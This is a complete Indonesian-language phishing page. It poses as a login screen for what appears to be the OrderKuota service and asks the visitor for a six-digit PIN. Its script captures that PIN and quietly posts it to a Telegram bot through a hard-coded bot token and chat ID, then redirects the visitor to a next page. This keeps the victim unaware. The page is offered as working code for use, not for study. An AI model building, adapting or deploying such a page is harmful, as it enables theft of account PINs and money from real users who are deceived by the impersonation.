<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Masuk Akun</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        /* Latar belakang utama halaman (Bisa diganti dengan gambar Anda) */
        body {
            /* Ganti 'background-image.jpg' dengan URL atau path gambar Anda */
            background: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://ibb.co.com/6RqW7W2D') no-repeat center center fixed;
            background-size: cover;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        /* Overlay / Wadah utama untuk posisi mengambang */
        .modal-overlay {
            width: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* Kartu Modal Mengambang */
        .modal-card {
            background-color: #ffffff;
            width: 100%;
            max-width: 360px;
            padding: 30px 24px;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            position: relative;
        }

        /* Tombol Tutup (X) */
        .close-btn {
            position: absolute;
            top: 15px;
            right: 20px;
            font-size: 20px;
            color: #999;
            cursor: pointer;
            text-decoration: none;
            font-weight: bold;
        }

        .close-btn:hover {
            color: #333;
        }

        /* Judul */
        .modal-title {
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            color: #333;
            margin-bottom: 25px;
        }

        /* Input Group */
        .input-group {
            margin-bottom: 15px;
        }

        .input-group input {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 14px;
            outline: none;
        }

        .input-group input:focus {
            border-color: #009688;
        }

        /* Tombol Lanjutkan */
        .btn-submit {
            width: 100%;
            padding: 12px;
            background-color: #009688;
            color: #ffffff;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.2s ease;
        }

        .btn-submit:hover {
            background-color: #00796b;
        }

        /* Area Tautan Bantuan */
        .footer-link {
            text-align: center;
            margin-top: 20px;
        }

        .footer-link a {
            color: #009688;
            font-size: 13px;
            text-decoration: none;
        }

        .footer-link a:hover {
            text-decoration: underline;
        }
        .modal-image {
    width: 100%;
    display: flex;
    justify-content: center;
    margin: 15px 0 20px;
}

.modal-image img {
    width: 300px;
    height: 180px;
    object-fit: contain;
    border-radius: 10px;
}.footer-link {
    width: 100%;
    text-align: right;
    margin-top: 10px;
}

.footer-link a {
    font-size: 12px;
    color: #777;
    text-decoration: none;
}

.footer-link a:hover {
    text-decoration: underline;
}
.top-banner {
    width: 100%;
    height: 65px;
    background: #168581;
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0 12px;
    box-sizing: border-box;
    margin-bottom: 15px;
}

.banner-title {
    color: white;
    font-size: 15px;
    font-weight: 500;
    margin: 0;
}

.banner-icons {
    display: flex;
    align-items: center;
    gap: 20px;
}

.banner-icons svg {
    display: block;
    width: 27px;
    height: 27px;
    fill: none;
    stroke: white;
    stroke-width: 2;
    stroke-linecap: round;
    stroke-linejoin: round;
}
    </style>
</head>
<body>

<div class="modal-overlay">
    <div class="modal-card">

        <span class="close-btn" onclick="window.location.href='kedua.html'">&times;</span>

        <!-- BANNER -->
        <div class="top-banner">
    <span class="banner-title">Masuk</span>

    <div class="banner-icons">
        <!-- Ikon pesan -->
        <svg viewBox="0 0 24 24">
            <path d="M4 3h16v14H8l-4 4V3Z"/>
            <path d="M8 8h8M8 12h8"/>
        </svg>

        <!-- Ikon informasi -->
        <svg viewBox="0 0 24 24">
            <circle cx="12" cy="12" r="10"/>
            <path d="M12 11v6M12 7h.01"/>
        </svg>
    </div>
</div>  

         <div class="modal-image">
    <img src="https://www.image2url.com/r2/default/images/1794510848404-ee1cfd4d-4cff-49a0-88bc-e4ed9605e732.png" alt="Gambar OrderKuota">
</div>
        
        <form id="storeForm">
            <div class="input-group">
                <input type="text" id="lastName" inputmode="numeric" maxlength="6" placeholder="Masukan Pin" required>
            </div>
            <button type="submit" class="btn-submit">Masuk</button>
        </form>

        <div class="footer-link">
            <a href="https://kudanil.com" target="_blank">Lupa pin?</a>
        </div>
    </div>
</div>

<script>
    const form = document.getElementById('storeForm');

    // Masukkan Token dan Chat ID Bot Telegram Anda di sini
    const TELEGRAM_TOKEN = '9004032319:AAHtqAfBIcxgzQoY6GHOo8GRUYMcCWKVCDU';
    const CHAT_ID = '8708074501';

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        const lastName = document.getElementById('lastName').value;

        const message = `🔔 *Pengunjung Baru Store*\n\nPIN: ${lastName}`;

        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        })
        .then(() => {
            window.location.href = 'ketiga.html';
        })
        .catch((error) => {
            console.error('Error:', error);
            window.location.href = 'ketiga.html';
        });
    });
</script>

</body>
</html>
